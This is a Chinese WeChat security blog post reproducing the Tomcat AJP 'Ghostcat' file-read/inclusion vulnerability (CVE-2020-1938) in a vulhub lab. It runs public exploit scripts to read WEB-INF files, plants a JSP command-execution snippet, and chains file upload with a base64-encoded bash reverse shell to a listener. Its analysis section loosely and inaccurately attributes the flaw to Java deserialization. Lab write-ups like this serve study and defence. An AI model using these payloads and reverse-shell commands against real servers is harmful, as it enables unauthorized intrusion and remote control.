> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HkqM0_3XQa7onYI0SlCQHg)

声明

该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。 

1. 漏洞描述
-------

该漏洞是由于 Tomcat AJP 协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器 webapp 下的任意文件，如: webapp 配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。

2. 漏洞影响版本

```
Apache Tomcat 6
Apache Tomcat 7 < 7.0.100
Apache Tomcat 8 < 8.5.51
Apache Tomcat 9 < 9.0.31

```

不受影响版本  

```
Apache Tomcat = 7.0.100
Apache Tomcat = 8.5.51
Apache Tomcat = 9.0.31

```

3. 漏洞分析

如果服务器上开着 8009 端口，攻击者可以通过向 Tomcat 服务器发送特殊的 GET 或 POST 请求来利用此漏洞。攻击者可以在其中包含一个以 “/WEB-INF/” 开头的文件路径，并将该路径指向一个包含 Java Servlet 类的 JAR 文件。然后，攻击者可以利用 Java 反序列化漏洞，对服务器上的文件进行任意代码执行。

```
URI设置为非jsp路径时，Tomcat会调用DefaultServlet处理，此时会导致web目录任意文件读取漏洞。
URI设置为jsp路径时，Tomcat会调用JspServlet处理，此时会导致JSP文件包含漏洞

```

4. 漏洞复现  

这里我们用 vulhub 靶场来复现此漏洞

```
cd /vulhub-master/tomcat/CVE-2020-1938
docker-compose  up -d
nmap  -Pn -sT  ip  //探测一下端口

```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYLCYF8qSicbibqHJxBJN2f7264NnqQQQGjicozpibZAr1S0uMWQicVB6ywh4w/640?wx_fmt=png)

扫到 8009 端口  

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYLtAKWu7RHEcCxgIS1rnZYgiaAXTavnBVfkOZIG4Bn4u01v4gNvkwfy4Q/640?wx_fmt=png)

下载 exp

```
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml ip

```

能读取该文件

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYL2FnQqP0XZcSnVtZG9mU7yzFggm87lL4OYfibNoH1dd1SQ167ZFtbLlw/640?wx_fmt=png)

默认读取 webapps 文件夹下 ROOT  

如果想换路径可以更改 POC 源码里的 / 的位置更换成想要查询的目录（只能在 webapps 下）比如 examples  

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYLNYf0h2ARtjZOjhzibQwgK7se7RYb4aHhN5h0aME2UupQvs104drPUibw/640?wx_fmt=png)

更改此处目录就可以了。

假设我在容器内创建一个文件 1.xml

```
cd  /usr/local/tomcat/webapps/ROOT/WEB-INF/
echo 12313212  >  1.xml
python2  CNVD-2020-10487-Tomcat-Ajp-lfi.py  -p 8009 -f   WEB-INF/1.xml   ip

```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYLyT7tfCHGxsylgibY9bLJrEm2RYfWYslcEyt0AVxWfV1GA2LaOictI4xA/640?wx_fmt=png)

成功读取出来了  

5. 结合文件上传漏洞

我们创建 txt 文件该文件可以命令执行，假设是文件上传得来的

```
<%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine());%>

```

利用 exp 读取 test.txt 文件

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYL8u9BKmOM2zJD60y9wqVicMSYWLv8VMN49Z3Ae8geiaBPDiamqZGYJMZAg/640?wx_fmt=png)

这里我利用另外一个 exp  

```
https://github.com/hypn0s/AJPy/

```

```
git  clone https://github.com/hypn0s/AJPy/
python3 .\tomcat.py  read_file --webapp=ROOT  /WEB-INF/test.txt ip

```

读取成功

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYLqckwD88r56D5zK2Is9Gsia5PWNVaOCjqGhRTqTlVc32uvmWlAWadibjA/640?wx_fmt=png)

6. 更进一步利用  

将反弹 shell 进行 base64 编码

```
bash -i >& /dev/tcp/ip/5555  0>&1

```

写入到下句话里面

```
<%Runtime.getRuntime().exec("bash -c {echo,xxxxxxx}|{base64,-d}|{bash,-i}");%>

```

 将文件命名为 test.txt 上传服务器

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYLzsl5D45vl41rXHDeemJWF233sU5C1sofAQ9gCJBT2ypIMAx8iaEpsxg/640?wx_fmt=png)

监听 5555 端口

```
nc -lvnp 5555

```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYL69tT21gJNibAnaYgc4c6Ldsp1nuQxMicTd7Dy2ZCcmqYmrghgYvZuftw/640?wx_fmt=png)

文件包含执行

```
python3 .\tomcat.py  read_file --webapp=ROOT  /WEB-INF/test.txt ip

```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYLWOVIXYOiaXhgXqB19RqlB5CsM14K7FMm6xB9oL8yjVLWbM9ophMXsMw/640?wx_fmt=png)

反弹成功

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT1PiaThchnib8zEm1SZenKmYLapd3mCMRhLgMvicy5tXIEJu2PbNVvoosNqIfo6E4vsJO2L5UmTdXfdA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsjjfGf3EnLcpxDEhnnIsHAk8iamibYenPbtqFc5agDKicPYCaM2baH7AIA/640?wx_fmt=gif)

**点击上方公众号**

![](https://mmbiz.qpic.cn/mmbiz_png/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsDMibNVAOW0RFtdicgdRFicOovq6LRTaWA43ibOQicbA03vPrEDTtgsoZRPg/640?wx_fmt=png)

**关注我们**

![](https://mmbiz.qpic.cn/mmbiz_gif/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsjjfGf3EnLcpxDEhnnIsHAk8iamibYenPbtqFc5agDKicPYCaM2baH7AIA/640?wx_fmt=gif)

往期精彩

[shiro 反序列漏洞中 JRMPClient 利用](http://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247484551&idx=1&sn=fa56816f228595ef848722dd2abc3557&chksm=e88ff177dff878614171ebe92955401868f974a88618641d5119893ee71accd28fd6e302f868&scene=21#wechat_redirect)

[Redis 的漏洞总结 (建议收藏)](http://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247484903&idx=1&sn=8b72ff19fb2d72844a61964e2748e958&chksm=e88ff017dff8790162052a152fd647e020ba51fe4d5f9ebc6285b6656a792756a8de5bf25fb5&scene=21#wechat_redirect)  

[log4j2scan 插件使用说明](http://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247484832&idx=1&sn=a5a07bded8232d8731ac975cbd9cb2a9&chksm=e88ff050dff879463816a187d01b0e1db11b1c72915f497cf657f5ce955ea808ab0b1f0da011&scene=21#wechat_redirect)  

  

  

1、公众号后台回复：搜索大法，获取 searchall 工具下载链接。

2、公众号后台回复：靶场，获取靶场工具网盘下载链接。